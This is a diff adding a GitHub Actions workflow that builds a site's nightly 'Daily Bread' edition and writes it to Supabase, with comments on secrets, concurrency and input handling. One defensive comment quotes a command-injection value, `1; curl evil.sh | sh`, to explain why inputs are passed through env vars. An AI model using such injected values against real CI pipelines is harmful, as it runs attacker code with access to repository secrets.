@@ -1,0 +1,90 @@
+name: daily-edition
+
+# The Daily Bread's content pipeline (SA-090 / F-136).
+#
+# Nightly at 03:00 UTC this builds tomorrow's edition and writes the rows
+# straight to Supabase. No commit and no deploy is involved in publishing
+# content, which keeps the project's most failure-prone operation out of the
+# daily path (Cloudflare Cron is inert here — wrangler.jsonc has triggers.crons
+# commented out and the OpenNext worker exports only `fetch`).
+#
+# Deterministic sections (crossword, prayer, word, quiz, …) are written as
+# `published` by the runner and are live the moment this job succeeds. Reviewed
+# kinds land as drafts and wait in /admin/edition. If this job fails, yesterday's
+# edition simply stays up and the gap is visible in the Actions tab.
+#
+# REQUIRED SECRETS — add under repo Settings → Secrets and variables → Actions:
+#   - NEXT_PUBLIC_SUPABASE_URL   — where the rows are written
+#   - SUPABASE_SERVICE_ROLE_KEY  — the only role allowed to write edition_items
+#   - ANTHROPIC_API_KEY          — the Sunday net-new Lead runs through the
+#                                  brain router; without it every Sunday build
+#                                  fails (Mon-Sat rotation needs no model)
+# None has a default and none is optional. A missing Supabase secret arrives as
+# an empty string and the runner aborts before it generates anything, naming the
+# missing key. There is deliberately no `continue-on-error` anywhere in this
+# workflow: a silently-skipped nightly build is indistinguishable from a working
+# one until a reader opens an empty paper.
+#
+# Manual trigger: Actions tab → daily-edition → Run workflow. `days` builds a
+# window (the founder's monthly-weekend fallback is days=30); `from` overrides
+# the first date and defaults to tomorrow (UTC) when left blank.
+
+on:
+  schedule:
+    - cron: '0 3 * * *' # nightly 03:00 UTC — builds tomorrow's edition
+  workflow_dispatch:
+    inputs:
+      days:
+        description: 'How many consecutive editions to build'
+        required: false
+        default: '1'
+      from:
+        description: 'First edition date, YYYY-MM-DD (UTC). Blank = tomorrow.'
+        required: false
+        default: ''
+
+permissions:
+  contents: read
+
+# One edition build at a time. A manual dispatch that lands on top of the 03:00
+# nightly would have both runs upserting the same (kind, publish_date, slot)
+# rows concurrently. Queue instead of cancelling: the run already in flight is
+# the one that must finish, and a cancelled build leaves a half-written edition.
+concurrency:
+  group: daily-edition
+  cancel-in-progress: false
+
+jobs:
+  build-edition:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 22
+          cache: 'npm'
+
+      - run: npm ci
+
+      # Both dispatch inputs reach the shell as env vars and are read as shell
+      # variables, never interpolated into `run:`. A `${{ }}` expansion is
+      # pasted into the script before bash ever sees it, so a `days` value of
+      # `1; curl evil.sh | sh` would run as a second command; `"$EDITION_DAYS"`
+      # is just a (rejected) argument. On `schedule` the inputs context is
+      # empty, so `|| 1` supplies the nightly default of tomorrow's edition.
+      - name: Build edition(s)
+        env:
+          NEXT_PUBLIC_SUPABASE_URL: ${{ secrets.NEXT_PUBLIC_SUPABASE_URL }}
+          SUPABASE_SERVICE_ROLE_KEY: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}
+          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+          EDITION_FROM: ${{ inputs.from }}
+          EDITION_DAYS: ${{ inputs.days || 1 }}
+        run: |
+          set -euo pipefail
+          if [ -n "${EDITION_FROM:-}" ]; then
+            node scripts/edition/build.mjs --days="$EDITION_DAYS" --from="$EDITION_FROM"
+          else
+            node scripts/edition/build.mjs --days="$EDITION_DAYS"
+          fi
